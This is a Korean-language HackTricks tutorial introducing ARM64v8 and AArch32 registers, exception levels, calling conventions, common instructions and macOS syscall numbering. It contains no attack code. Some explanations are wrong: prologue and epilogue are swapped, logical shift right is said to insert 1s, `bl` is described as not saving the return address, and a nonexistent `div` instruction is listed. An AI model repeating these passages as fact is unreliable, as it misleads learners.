# ARM64v8 소개

{{#include ../../../banners/hacktricks-training.md}}


## **예외 레벨 - EL (ARM64v8)**

ARMv8 architecture에서 execution level은 Exception Level(EL)이라고 하며, execution environment의 privilege level과 기능을 정의합니다. 예외 레벨은 EL0부터 EL3까지 4개이며, 각각 서로 다른 용도로 사용됩니다.

1. **EL0 - User Mode**:
- 가장 낮은 privilege level로, 일반 application code를 실행하는 데 사용됩니다.
- EL0에서 실행되는 application은 서로 및 system software로부터 격리되어 security와 stability가 향상됩니다.
2. **EL1 - Operating System Kernel Mode**:
- 대부분의 operating system kernel이 이 레벨에서 실행됩니다.
- EL1은 EL0보다 많은 privilege를 가지며 system resource에 접근할 수 있지만, system integrity를 보장하기 위한 일부 제한이 적용됩니다. `SVC` instruction을 사용해 EL0에서 EL1로 이동합니다.
3. **EL2 - Hypervisor Mode**:
- 이 레벨은 virtualization에 사용됩니다. EL2에서 실행되는 hypervisor는 동일한 physical hardware에서 여러 operating system(각각 자체 EL1에서 실행)을 관리할 수 있습니다.
- EL2는 virtualized environment를 격리하고 제어하기 위한 기능을 제공합니다.
- 따라서 Parallels와 같은 virtual machine application은 `hypervisor.framework`를 사용해 EL2와 상호작용하고, kernel extension 없이 virtual machine을 실행할 수 있습니다.
- EL1에서 EL2로 이동할 때는 `HVC` instruction을 사용합니다.
4. **EL3 - Secure Monitor Mode**:
- 가장 높은 privilege level이며, secure booting과 trusted execution environment에 자주 사용됩니다.
- EL3는 secure state와 non-secure state 사이의 접근을 관리하고 제어할 수 있습니다(예: secure boot, trusted OS 등).
- macOS에서는 KPP(Kernel Patch Protection)에 사용되었지만 더 이상 사용되지 않습니다.
- Apple은 더 이상 EL3를 사용하지 않습니다.
- EL3로의 전환은 일반적으로 `SMC`(Secure Monitor Call) instruction을 사용해 수행됩니다.

이러한 레벨을 사용하면 user application부터 가장 높은 privilege를 가진 system software까지 system의 다양한 요소를 구조적이고 안전하게 관리할 수 있습니다. ARMv8의 privilege level 방식은 서로 다른 system component를 효과적으로 격리하여 system의 security와 robustness를 향상합니다.

## **Registers (ARM64v8)**

ARM64에는 `x0`부터 `x30`까지 표시되는 **31개의 general-purpose register**가 있습니다. 각 register는 **64-bit**(8-byte) 값을 저장할 수 있습니다. 32-bit 값만 필요한 operation에서는 동일한 register를 w0부터 w30까지의 이름으로 32-bit mode에서 접근할 수 있습니다.

1. **`x0`**부터 **`x7`** - 일반적으로 scratch register 및 subroutine에 parameter를 전달하는 용도로 사용됩니다.
- **`x0`**는 function의 return data도 전달합니다.
2. **`x8`** - Linux kernel에서 `x8`은 `svc` instruction의 system call number로 사용됩니다. **macOS에서는 x16을 사용합니다!**
3. **`x9`**부터 **`x15`** - 추가 temporary register이며, local variable에 자주 사용됩니다.
4. **`x16`** 및 **`x17`** - **Intra-procedural Call Register**입니다. Immediate value를 위한 temporary register입니다. Indirect function call과 PLT(Procedure Linkage Table) stub에도 사용됩니다.
- **macOS에서는 `x16`이 `svc` instruction의 **system call number**로 사용됩니다.**
5. **`x18`** - **Platform register**입니다. general-purpose register로 사용할 수도 있지만, 일부 platform에서는 platform-specific 용도로 예약됩니다. 예를 들어 Windows에서는 현재 thread environment blockへの pointer로, Linux kernel에서는 현재 **executing task structure**를 가리키는 데 사용됩니다.
6. **`x19`**부터 **`x28`** - callee-saved register입니다. function은 caller를 위해 이 register의 값을 보존해야 하므로 stack에 저장한 후 caller로 돌아가기 전에 복구합니다.
7. **`x29`** - stack frame을 추적하는 **frame pointer**입니다. function 호출로 새로운 stack frame이 생성되면 **`x29`** register가 **stack에 저장**되고, **새로운** frame pointer address(**`sp` address)가 이 register에 **저장**됩니다.
- 이 register는 **general-purpose register**로도 사용할 수 있지만, 일반적으로 **local variable**을 참조하는 데 사용됩니다.
8. **`x30`** 또는 **`lr`** - **Link register**입니다. `BL`(Branch with Link) 또는 `BLR`(Branch with Link to Register) instruction이 실행될 때 `pc` 값을 이 register에 저장하여 **return address**를 보관합니다.
- 다른 register와 동일하게 사용할 수도 있습니다.
- 현재 function이 새로운 function을 호출하여 `lr`을 덮어쓰게 되는 경우, 시작 부분에서 이를 stack에 저장합니다. 이것이 epilogue입니다(`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`와 `lr`을 저장하고, 공간을 생성한 후 새로운 `fp`를 가져옴). 마지막에는 이를 복구하며, 이것이 prologue입니다(`ldp x29, x30, [sp], #48; ret` -> `fp`와 `lr`을 복구하고 return).
9. **`sp`** - stack의 top을 추적하는 데 사용되는 **Stack pointer**입니다.
- **`sp`** 값은 항상 최소한 **quadword alignment**를 유지해야 하며, 그렇지 않으면 alignment exception이 발생할 수 있습니다.
10. **`pc`** - 다음 instruction을 가리키는 **Program counter**입니다. 이 register는 exception generation, exception return 및 branch를 통해서만 업데이트할 수 있습니다. 이 register를 읽을 수 있는 유일한 일반 instruction은 branch with link instruction(BL, BLR)이며, `pc` address를 `lr`(Link Register)에 저장하는 데 사용됩니다.
11. **`xzr`** - **Zero register**입니다. **32**-bit register form에서는 **`wzr`**이라고도 합니다. zero value를 쉽게 가져오거나(일반적인 operation), **`subs`**를 사용하여 비교를 수행하는 데 사용할 수 있습니다. 예: **`subs XZR, Xn, #10`**은 결과 data를 어디에도 저장하지 않습니다(`xzr`에 저장).

**`Wn`** register는 **`Xn`** register의 **32-bit version**입니다.

> [!TIP]
> X0 - X18 register는 volatile하며, function call과 interrupt에 의해 값이 변경될 수 있습니다. 반면 X19 - X28 register는 non-volatile이므로 function call 전후에 값이 보존되어야 합니다("callee saved").

### SIMD 및 Floating-Point Register

또한 optimized single instruction multiple data(SIMD) operation 및 floating-point arithmetic에 사용할 수 있는 **128-bit 길이의 register가 32개 더 있습니다**. 이를 Vn register라고 하며, **64**-bit, **32**-bit, **16**-bit 및 **8**-bit로도 동작할 수 있습니다. 이때 각각 **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** 및 **`Bn`**이라고 합니다.

### System Register

**수백 개의 system register**가 있으며, special-purpose register(SPR)라고도 합니다. 이 register는 **processor**의 동작을 **monitoring**하고 **제어**하는 데 사용됩니다.\
전용 special instruction인 **`mrs`**와 **`msr`**를 통해서만 읽거나 설정할 수 있습니다.

special register인 **`TPIDR_EL0`** 및 **`TPIDDR_EL0`**는 reverse engineering에서 자주 발견됩니다. `EL0` suffix는 해당 register에 접근할 수 있는 **최소 예외 레벨**을 의미합니다(이 경우 EL0은 일반 program이 실행되는 일반 exception(privilege) level입니다).\
이 register는 memory의 **thread-local storage** 영역의 **base address**를 저장하는 데 자주 사용됩니다. 일반적으로 첫 번째 register는 EL0에서 실행되는 program이 읽고 쓸 수 있지만, 두 번째 register는 EL0에서 읽을 수 있고 EL1(예: kernel)에서 쓸 수 있습니다.

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE**는 여러 process component를 operating system에서 볼 수 있는 **`SPSR_ELx`** special register에 serialize하여 포함합니다. 여기서 X는 **trigger된 exception의 permission level**이며, 이를 통해 exception이 종료될 때 process state를 복구할 수 있습니다.\
접근 가능한 field는 다음과 같습니다.

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** 및 **`V`** condition flag:
- **`N`**은 operation이 negative result를 생성했음을 의미합니다.
- **`Z`**는 operation이 zero를 생성했음을 의미합니다.
- **`C`**는 operation에서 carry가 발생했음을 의미합니다.
- **`V`**는 operation이 signed overflow를 생성했음을 의미합니다.
- 두 positive number의 합이 negative result를 생성하는 경우
- 두 negative number의 합이 positive result를 생성하는 경우
- subtraction에서 큰 negative number를 더 작은 positive number에서 빼거나(또는 그 반대의 경우), 결과가 주어진 bit size의 범위 내에서 표현될 수 없는 경우
- processor는 operation이 signed인지 unsigned인지 알 수 없으므로 operation에서 C와 V를 확인하고, signed 또는 unsigned operation에서 carry가 발생했는지 표시합니다.

> [!WARNING]
> 모든 instruction이 이 flag를 업데이트하는 것은 아닙니다. **`CMP`** 또는 **`TST`**와 같은 instruction은 업데이트하며, **`ADDS`**처럼 s suffix가 있는 instruction도 업데이트합니다.

- 현재 **register width(`nRW`) flag**: flag 값이 0이면 program은 재개될 때 AArch64 execution state에서 실행됩니다.
- 현재 **Exception Level**(**`EL`**): EL0에서 실행되는 일반 program의 값은 0입니다.
- **single stepping** flag(**`SS`**): debugger가 exception을 통해 **`SPSR_ELx`** 내부의 SS flag를 1로 설정하여 single step을 수행하는 데 사용됩니다. program은 한 step을 실행한 후 single step exception을 발생시킵니다.
- **illegal exception** state flag(**`IL`**): privileged software가 잘못된 exception level transfer를 수행할 때 표시하는 데 사용됩니다. 이 flag가 1로 설정되고 processor가 illegal state exception을 trigger합니다.
- **`DAIF`** flag: 이 flag를 사용하면 privileged program이 특정 external exception을 선택적으로 mask할 수 있습니다.
- **`A`**가 1이면 **asynchronous abort**가 trigger됩니다. **`I`**는 external hardware **Interrupt Request**(IRQ)에 응답하도록 설정합니다. F는 **Fast Interrupt Request**(FIR)와 관련됩니다.
- **stack pointer select** flag(**`SPS`**): EL1 이상에서 실행되는 privileged program은 자체 stack pointer register와 user-model stack pointer 사이에서 전환할 수 있습니다(예: `SP_EL1`과 `EL0` 사이). 이 전환은 **`SPSel`** special register에 write하여 수행합니다. EL0에서는 수행할 수 없습니다.

## **Calling Convention (ARM64v8)**

ARM64 calling convention에서는 function의 **첫 8개 parameter**를 **`x0`**부터 **`x7`**까지의 register에 전달합니다. **추가** parameter는 **stack**으로 전달됩니다. **return** value는 **`x0`** register로 전달되며, **128 bit 길이인 경우에는 `x1`**도 함께 사용합니다. **`x19`**부터 **`x30`** 및 **`sp`** register는 function call 전후에 **보존**되어야 합니다.

assembly에서 function을 읽을 때는 **function prologue와 epilogue**를 확인해야 합니다. **prologue**는 일반적으로 **frame pointer(`x29`)를 저장**하고, **새로운 frame pointer를 설정**하며, **stack space를 할당**합니다. **epilogue**는 일반적으로 저장된 frame pointer를 **복구**하고 function에서 **return**합니다.

### Swift의 Calling Convention

Swift에는 자체 **calling convention**이 있으며, [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)에서 확인할 수 있습니다.

## **Common Instructions (ARM64v8)**

ARM64 instruction은 일반적으로 **`opcode dst, src1, src2`** 형식을 사용합니다. 여기서 **`opcode`**는 수행할 **operation**(`add`, `sub`, `mov` 등)이고, **`dst`**는 결과를 저장할 **destination** register이며, **`src1`** 및 **`src2`**는 **source** register입니다. source register 대신 immediate value를 사용할 수도 있습니다.

- **`mov`**: 한 **register**의 값을 다른 **register**로 **이동**합니다.
- Example: `mov x0, x1` — `x1`의 값을 `x0`으로 이동합니다.
- **`ldr`**: **memory**에서 값을 **register**로 **load**합니다.
- Example: `ldr x0, [x1]` — `x1`이 가리키는 memory location의 값을 `x0`으로 load합니다.
- **Offset mode**: origin pointer에 적용되는 offset은 다음과 같이 표시됩니다.
- `ldr x2, [x1, #8]`, `x1 + 8`의 값을 x2에 load합니다.
- `ldr x2, [x0, x1, lsl #2]`, array x0에서 x1(index) \* 4 위치의 object를 x2에 load합니다.
- **Pre-indexed mode**: origin에 계산을 적용하고, 결과를 가져온 다음 새로운 origin을 origin에 저장합니다.
- `ldr x2, [x1, #8]!`, `x1 + 8`을 `x2`에 load하고 `x1`에 `x1 + 8`의 결과를 저장합니다.
- `str lr, [sp, #-4]!`, link register를 sp에 저장하고 sp register를 업데이트합니다.
- **Post-index mode**: 이전 방식과 유사하지만 memory address에 접근한 후 offset을 계산하고 저장합니다.
- `ldr x0, [x1], #8`, `x1`을 `x0`에 load하고 x1을 `x1 + 8`로 업데이트합니다.
- **PC-relative addressing**: 이 경우 load할 address는 PC register를 기준으로 계산됩니다.
- `ldr x1, =_start`, 현재 PC를 기준으로 `_start` symbol이 시작되는 address를 x1에 load합니다.
- **`str`**: **register**의 값을 **memory**에 **store**합니다.
- Example: `str x0, [x1]` — `x0`의 값을 `x1`이 가리키는 memory location에 store합니다.
- **`ldp`**: **Load Pair of Registers**. 이 instruction은 **연속된 memory** location에서 두 register를 **load**합니다. memory address는 일반적으로 다른 register의 값에 offset을 더해 구성됩니다.
- Example: `ldp x0, x1, [x2]` — `x2` 및 `x2 + 8`의 memory location에서 각각 `x0`과 `x1`을 load합니다.
- **`stp`**: **Store Pair of Registers**. 이 instruction은 두 register를 **연속된 memory** location에 **store**합니다. memory address는 일반적으로 다른 register의 값에 offset을 더해 구성됩니다.
- Example: `stp x0, x1, [sp]` — `x0`과 `x1`을 각각 `sp` 및 `sp + 8`의 memory location에 store합니다.
- `stp x0, x1, [sp, #16]!` — `x0`과 `x1`을 각각 `sp+16` 및 `sp + 24`의 memory location에 store하고, `sp`를 `sp+16`으로 업데이트합니다.
- **`add`**: 두 register의 값을 **더하고** 결과를 register에 저장합니다.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register 또는 immediate)
- \[shift #N | RRX] -> shift를 수행하거나 RRX를 호출합니다.
- Example: `add x0, x1, x2` — `x1`과 `x2`의 값을 더해 결과를 `x0`에 저장합니다.
- `add x5, x5, #1, lsl #12` — 이는 4096과 같습니다(1을 12번 shift하는 것) -> 1 0000 0000 0000 0000
- **`adds`** 이 instruction은 `add`를 수행하고 flag를 업데이트합니다.
- **`sub`**: 두 register의 값을 **빼고** 결과를 register에 저장합니다.
- **`add`** **syntax**를 참고하세요.
- Example: `sub x0, x1, x2` — `x1`에서 `x2`의 값을 빼고 결과를 `x0`에 저장합니다.
- **`subs`** `sub`과 같지만 flag를 업데이트합니다.
- **`mul`**: **두 register**의 값을 **곱하고** 결과를 register에 저장합니다.
- Example: `mul x0, x1, x2` — `x1`과 `x2`의 값을 곱해 결과를 `x0`에 저장합니다.
- **`div`**: 한 register의 값을 다른 register의 값으로 나누고 결과를 register에 저장합니다.
- Example: `div x0, x1, x2` — `x1`의 값을 `x2`로 나눠 결과를 `x0`에 저장합니다.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: 끝에 0을 추가하여 다른 bit를 앞으로 이동합니다(n회 2를 곱하는 효과).
- **Logical shift right**: 시작 부분에 1을 추가하여 다른 bit를 뒤로 이동합니다(unsigned에서 n회 2로 나누는 효과).
- **Arithmetic shift right**: **`lsr`**과 같지만, most significant bit가 1인 경우 0 대신 **1을 추가**합니다(signed에서 n회 2로 나누는 효과).
- **Rotate right**: **`lsr`**과 같지만 오른쪽에서 제거된 bit를 왼쪽에 추가합니다.
- **Rotate Right with Extend**: **`ror`**과 같지만 carry flag를 "most significant bit"로 사용합니다. carry flag를 bit 31로 이동하고 제거된 bit를 carry flag로 이동합니다.
- **`bfm`**: **Bit Field Move**. 이 operation은 값에서 **bit `0...n`**을 복사하여 **`m..m+n`** 위치에 배치합니다. **`#s`**는 **leftmost bit** position을, **`#r`**은 **rotate right amount**를 지정합니다.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** register에서 bitfield를 복사하여 다른 register에 복사합니다.
- **`BFI X1, X2, #3, #4`** X2에서 4개 bit를 가져와 X1의 3번째 bit부터 삽입합니다.
- **`BFXIL X1, X2, #3, #4`** X2의 3번째 bit부터 4개 bit를 추출하여 X1에 복사합니다.
- **`SBFIZ X1, X2, #3, #4`** X2의 4개 bit를 sign-extend하고 bit position 3부터 X1에 삽입하며 오른쪽 bit를 0으로 설정합니다.
- **`SBFX X1, X2, #3, #4`** X2에서 bit 3부터 4개 bit를 추출하고 sign-extend한 뒤 결과를 X1에 배치합니다.
- **`UBFIZ X1, X2, #3, #4`** X2의 4개 bit를 zero-extend하고 bit position 3부터 X1에 삽입하며 오른쪽 bit를 0으로 설정합니다.
- **`UBFX X1, X2, #3, #4`** X2에서 bit 3부터 4개 bit를 추출하고 zero-extend한 결과를 X1에 배치합니다.
- **Sign Extend To X:** 값의 sign을 확장하거나(unsigned version에서는 0만 추가하여) 해당 값으로 operation을 수행할 수 있게 합니다.
- **`SXTB X1, W2`** byte의 sign을 **W2에서 X1로** 확장합니다(`W2`는 `X2`의 절반)하여 64bit를 채웁니다.
- **`SXTH X1, W2`** 16bit number의 sign을 **W2에서 X1로** 확장하여 64bit를 채웁니다.
- **`SXTW X1, W2`** byte의 sign을 **W2에서 X1로** 확장하여 64bit를 채웁니다.
- **`UXTB X1, W2`** byte에 0(unsigned)을 추가하여 **W2에서 X1로** 확장하고 64bit를 채웁니다.
- **`extr`:** 지정된 **연결된 register pair**에서 bit를 추출합니다.
- Example: `EXTR W3, W2, W1, #3` 이는 **W1+W2**를 연결한 다음 **W2의 bit 3부터 W1의 bit 3까지**를 가져와 W3에 저장합니다.
- **`cmp`**: 두 register를 **비교**하고 condition flag를 설정합니다. destination register를 zero register로 설정하는 **`subs`의 alias**입니다. `m == n`인지 확인할 때 유용합니다.
- **`subs`**와 동일한 syntax를 지원합니다.
- Example: `cmp x0, x1` — `x0`과 `x1`의 값을 비교하고 그에 따라 condition flag를 설정합니다.
- **`cmn`**: **Compare negative** operand입니다. 이 경우 **`adds`의 alias**이며 동일한 syntax를 지원합니다. `m == -n`인지 확인할 때 유용합니다.
- **`ccmp`**: Conditional comparison입니다. 이전 comparison이 true인 경우에만 수행되며 nzcv bit를 명시적으로 설정합니다.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2이고 x3 < x4이면 func로 jump합니다.
- 이는 **이전 `cmp`가 `NE`인 경우에만** `ccmp`가 실행되기 때문입니다. 그렇지 않으면 `nzcv` bit가 0으로 설정되어 `blt` comparison을 만족하지 않습니다.
- 이는 `ccmn`으로도 사용할 수 있습니다(`cmp`와 `cmn`의 관계처럼 negative인 점만 다름).
- **`tst`**: comparison 값 중 두 값이 모두 1인지 확인합니다(결과를 어디에도 저장하지 않는 ANDS처럼 동작합니다). register의 값과 비교하여 해당 값에 표시된 register의 bit 중 하나라도 1인지 확인할 때 유용합니다.
- Example: `tst X1, #7` X1의 마지막 3개 bit 중 하나라도 1인지 확인합니다.
- **`teq`**: 결과를 버리는 XOR operation입니다.
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- link register에 return address를 채우지 않으므로 return해야 하는 subroutine call에는 적합하지 않습니다.
- **`bl`**: link가 있는 **Branch**이며 **subroutine을 call**하는 데 사용됩니다. **return address를 `x30`에 저장**합니다.
- Example: `bl myFunction` — `myFunction` function을 호출하고 return address를 `x30`에 저장합니다.
- link register에 return address를 채우지 않으므로 return해야 하는 subroutine call에는 적합하지 않습니다.
- **`blr`**: Register로 이동하는 Branch with Link이며, target이 **register에 지정된** **subroutine**을 call하는 데 사용됩니다. return address를 `x30`에 저장합니다. (이는
- Example: `blr x1` — `x1`에 포함된 address의 function을 호출하고 return address를 `x30`에 저장합니다.
- **`ret`**: 일반적으로 **`x30`**의 address를 사용하여 **subroutine**에서 **return**합니다.
- Example: `ret` — `x30`의 return address를 사용하여 현재 subroutine에서 return합니다.
- **`b.<cond>`**: Conditional branch
- **`b.eq`**: 이전 `cmp` instruction을 기준으로 **equal이면 branch**합니다.
- Example: `b.eq label` — 이전 `cmp` instruction에서 두 값이 같다고 판단하면 `label`로 jump합니다.
- **`b.ne`**: **Not Equal이면 Branch**합니다. 이 instruction은 이전 comparison instruction이 설정한 condition flag를 확인하고, 비교한 값이 같지 않으면 label 또는 address로 branch합니다.
- Example: `cmp x0, x1` instruction 이후 `b.ne label` — `x0`과 `x1`의 값이 같지 않으면 `label`로 jump합니다.
- **`cbz`**: **Compare and Branch on Zero**입니다. register를 zero와 비교하여 같으면 label 또는 address로 branch합니다.
- Example: `cbz x0, label` — `x0`의 값이 zero이면 `label`로 jump합니다.
- **`cbnz`**: **Compare and Branch on Non-Zero**입니다. register를 zero와 비교하여 같지 않으면 label 또는 address로 branch합니다.
- Example: `cbnz x0, label` — `x0`의 값이 zero가 아니면 `label`로 jump합니다.
- **`tbnz`**: bit를 test하고 nonzero이면 branch합니다.
- Example: `tbnz x0, #8, label`
- **`tbz`**: bit를 test하고 zero이면 branch합니다.
- Example: `tbz x0, #8, label`
- **Conditional select operation**: conditional bit에 따라 동작이 달라지는 operation입니다.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> true이면 X0 = X1, false이면 X0 = X2
- `csinc Xd, Xn, Xm, cond` -> true이면 Xd = Xn, false이면 Xd = Xm + 1
- `cinc Xd, Xn, cond` -> true이면 Xd = Xn + 1, false이면 Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> true이면 Xd = Xn, false이면 Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> true이면 Xd = NOT(Xn), false이면 Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> true이면 Xd = Xn, false이면 Xd = - Xm
- `cneg Xd, Xn, cond` -> true이면 Xd = - Xn, false이면 Xd = Xn
- `cset Xd, Xn, Xm, cond` -> true이면 Xd = 1, false이면 Xd = 0
- `csetm Xd, Xn, Xm, cond` -> true이면 Xd = \<all 1>, false이면 Xd = 0
- **`adrp`**: **symbol의 page address**를 계산하여 register에 저장합니다.
- Example: `adrp x0, symbol` — `symbol`의 page address를 계산하여 `x0`에 저장합니다.
- **`ldrsw`**: memory에서 signed **32-bit** 값을 **load**하고 이를 **64-bit**로 sign-extend합니다. 일반적인 SWITCH case에 사용됩니다.
- Example: `ldrsw x0, [x1]` — `x1`이 가리키는 memory location에서 signed 32-bit 값을 load하고, 이를 64-bit로 sign-extend하여 `x0`에 저장합니다.
- **`stur`**: 다른 register의 offset을 사용하여 register 값을 **memory location에 store**합니다.
- Example: `stur x0, [x1, #4]` — `x0`의 값을 현재 `x1`에 있는 address보다 4 byte 큰 memory address에 store합니다.
- **`svc`** : **system call**을 실행합니다. "Supervisor Call"의 약어입니다. processor가 이 instruction을 실행하면 **user mode에서 kernel mode로 전환**하고, **kernel의 system call handling** code가 위치한 memory의 특정 location으로 jump합니다.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **link register와 frame pointer를 stack에 저장**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **새 frame pointer 설정**: `mov x29, sp` (현재 함수의 새 frame pointer를 설정)
3. **로컬 변수용 스택 공간 할당** (필요한 경우): `sub sp, sp, <size>` (`<size>`는 필요한 바이트 수)

### **함수 에필로그**

1. **로컬 변수 할당 해제** (할당된 경우): `add sp, sp, <size>`
2. **링크 레지스터와 frame pointer 복원**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (주소를 link register에서 사용하여 caller에게 제어를 반환)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A는 32-bit programs의 실행을 지원합니다. **AArch32**는 **`A32`** 및 **`T32`**라는 **두 가지 instruction sets** 중 하나로 실행될 수 있으며, **`interworking`**을 통해 둘 사이를 전환할 수 있습니다.\
**Privileged** 64-bit programs는 더 낮은 권한의 32-bit로 exception level transfer를 실행하여 **32-bit** programs의 **execution**을 스케줄링할 수 있습니다.\
64-bit에서 32-bit로 전환될 때는 exception level이 낮아진다는 점에 유의해야 합니다(예: EL1의 64-bit program이 EL0의 program을 실행하는 경우). 이는 `AArch32` process thread가 실행될 준비가 되었을 때 **`SPSR_ELx`** special register의 **bit 4를** **1로** 설정하여 수행하며, `SPSR_ELx`의 나머지 부분에는 **`AArch32`** programs의 CPSR이 저장됩니다. 그런 다음 privileged process가 **`ERET`** instruction을 호출하면 processor는 CPSR에 따라 A32 또는 T32로 진입하여 **`AArch32`**로 전환됩니다.**

**`interworking`**은 CPSR의 J 및 T bits를 사용하여 수행됩니다. `J=0` 및 `T=0`은 **`A32`**를 의미하고, `J=0` 및 `T=1`은 **T32**를 의미합니다. 이는 기본적으로 instruction set이 T32임을 나타내기 위해 **가장 낮은 bit를 1로 설정하는 것**으로 해석됩니다.\
이는 **interworking branch instructions** 중에 설정되지만, PC가 destination register로 설정될 때 다른 instructions를 사용하여 직접 설정할 수도 있습니다. 예:

또 다른 예:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

16개의 32비트 레지스터(`r0-r15`)가 있습니다. **`r0`부터 `r14`까지** **어떤 연산에도** 사용할 수 있지만, 일부는 일반적으로 예약되어 있습니다:

- **`r15`**: Program counter (항상). 다음 instruction의 주소를 포함합니다. A32에서는 current + 8, T32에서는 current + 4입니다.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (stack은 항상 16바이트로 정렬됩니다)
- **`r14`**: Link Register

또한 레지스터는 **`banked registries`**에 백업됩니다. 이는 레지스터 값을 저장하는 공간으로, exception handling 및 privileged operation에서 매번 레지스터를 수동으로 저장하고 복원할 필요 없이 **빠른 context switching**을 수행할 수 있도록 합니다.\
이는 **`CPSR`의 processor state를 exception이 발생한 processor mode의 `SPSR`로 저장**하는 방식으로 수행됩니다. exception에서 return할 때는 **`SPSR`에서 `CPSR`이 복원**됩니다.

### CPSR - Current Program Status Register

AArch32에서 CPSR은 AArch64의 **`PSTATE`**와 유사하게 동작하며, 나중에 execution을 복원하기 위해 exception이 발생할 때 **`SPSR_ELx`**에도 저장됩니다:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

필드는 몇 가지 그룹으로 나뉩니다:

- Application Program Status Register (APSR): Arithmetic flags이며 EL0에서 접근할 수 있습니다
- Execution State Registers: Process behaviour (OS에서 관리)

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** flags (AArch64와 동일)
- **`Q`** flag: 특수한 saturating arithmetic instruction을 실행하는 동안 **integer saturation이 발생**할 때마다 1로 설정됩니다. 한 번 **`1`**로 설정되면 수동으로 0으로 설정할 때까지 해당 값을 유지합니다. 또한 값을 암시적으로 확인하는 instruction은 없으며, 직접 읽어서 확인해야 합니다.
- **`GE`** (Greater than or equal) Flags: "parallel add" 및 "parallel subtract"와 같은 SIMD (Single Instruction, Multiple Data) operation에서 사용됩니다. 이러한 operation을 사용하면 하나의 instruction으로 여러 data point를 처리할 수 있습니다.

예를 들어 **`UADD8`** instruction은 (두 개의 32비트 operand에서) **네 쌍의 byte를 병렬로 더하고**, 결과를 32비트 register에 저장합니다. 그런 다음 이러한 결과를 기반으로 **APSR의 `GE` flags를 설정**합니다. 각 GE flag는 하나의 byte addition에 대응하며, 해당 byte 쌍의 addition에서 **overflow가 발생했는지**를 나타냅니다.

**`SEL`** instruction은 이러한 GE flags를 사용하여 conditional action을 수행합니다.

#### Execution State Registers

- **`J`** 및 **`T`** bits: **`J`**는 0이어야 하며, **`T`**가 0이면 instruction set A32가 사용되고, 1이면 T32가 사용됩니다.
- **IT Block State Register** (`ITSTATE`): 10-15 및 25-26번 bit입니다. **`IT`**가 prefix로 붙은 group 내부 instruction의 conditions를 저장합니다.
- **`E`** bit: **endianness**를 나타냅니다.
- **Mode and Exception Mask Bits** (0-4): 현재 execution state를 결정합니다. **5번째 bit**는 program이 32bit(1)로 실행되는지 64bit(0)로 실행되는지를 나타냅니다. 나머지 4개는 현재 사용 중인 **exception mode**를 나타냅니다(exception이 발생하여 처리 중인 경우). 설정된 값은 처리 중에 다른 exception이 trigger될 때의 **현재 priority**를 나타냅니다.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: 일부 exception은 **`A`**, `I`, `F` bits를 사용하여 비활성화할 수 있습니다. **`A`**가 1이면 **asynchronous aborts**가 trigger된다는 의미입니다. **`I`**는 external hardware **Interrupts Requests** (IRQs)에 응답하도록 설정합니다. `F`는 **Fast Interrupt Requests** (FIRs)와 관련됩니다.

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)를 확인하거나 `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`를 실행하세요. BSD syscalls는 **x16 > 0**을 사용합니다.

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)에서 `mach_trap_table`을, [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)에서 prototypes를 확인하세요. Mach traps의 최대 개수는 `MACH_TRAP_TABLE_COUNT` = 128입니다. Mach traps는 **x16 < 0**을 사용하므로, 이전 목록의 number를 **minus**와 함께 호출해야 합니다. **`_kernelrpc_mach_vm_allocate_trap`**은 **`-10`**입니다.

disassembler에서 **`libsystem_kernel.dylib`**를 확인하여 이러한 (및 BSD) syscalls를 호출하는 방법을 확인할 수도 있습니다:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
